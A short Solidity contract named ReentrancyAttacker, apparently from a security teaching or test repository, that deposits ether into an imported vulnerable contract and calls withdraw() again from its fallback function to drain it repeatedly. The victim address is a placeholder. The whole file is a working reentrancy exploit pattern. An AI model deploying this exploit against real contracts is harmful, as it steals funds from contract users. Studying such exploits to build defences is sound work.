pragma solidity ^0.4.15;

import "../../security/contracts/Reentrancy.sol";

contract ReentrancyAttacker {

    uint value;
    address constant public victim = "address-vulnerable-contract";
    Reentrancy cont;

    event LogString(string s);

    function ReentrancyAttacker() {
        cont = Reentrancy(victim);
    }

    function deposit() payable {
        require (msg.value > 0);
        value += msg.value;
    }

    function depositInContract() payable {
        require(msg.value>0);
        cont.deposit.value(msg.value)();
    }

    function withdrawFromContract() {
        cont.withdraw();
    }

    function() payable {
        LogString("Running fallback function");
        cont.withdraw();
    }

    function getBalance() returns (uint) {
        return this.balance;
    }
}
